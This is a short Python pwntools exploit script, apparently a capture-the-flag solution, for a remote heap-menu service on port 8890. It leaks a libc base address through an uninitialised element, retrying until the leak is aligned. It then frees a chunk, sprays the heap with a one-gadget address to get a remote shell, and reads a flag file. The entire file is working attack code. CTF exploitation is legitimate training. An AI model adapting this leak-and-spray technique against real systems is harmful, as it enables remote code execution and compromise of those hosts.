#!/usr/bin/python

from pwn import *
import argparse

context.log_level = 'error'

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('host', metavar='host', type=str)

	args = parser.parse_args()

	libc_base_offset  = 0x39a188
	oneShot_offset    = 0x3f35a
	nb                = 1
	host              = args.host
	port              = 8890

	# create an empty element to leak
	while True:
		print "[i] Leak libc (nb:%d)" % nb
		p = remote(host,port)
		p.sendlineafter(">>> ","1")
		p.sendlineafter("the element: ","20")
		p.sendlineafter("the element: ","")
		try:
			libc_base = u64(p.recvuntil(">>> ").split('\n')[1][:8]) - libc_base_offset
		except:
			nb += 1
			p.close()
			continue
		if not (libc_base & 0x0000000000000fff):
			print "[i] Leak libc (OK)"
			oneShot   = libc_base + oneShot_offset
			break
		else:
			nb+=1
			p.close()

	# delete the magic chunk
	print "[i] Delete the magic chunk"
	p.sendline("2")
	p.sendline("0")

	# fullfill the heap
	print "[i] Fullfill the heap with the oneShot gadget"
	i = 0
	while i < 0x3c:
		p.sendline("1")
		p.sendline(str(8*0x100))
		p.sendline(p64(oneShot)*0x100)
		i += 1

	p.sendline("3")
	p.clean(1)
	p.sendline("cat /home/heapSpapray/flag.txt")
	p.interactive()
	p.close()

if __name__ == '__main__':
	main()
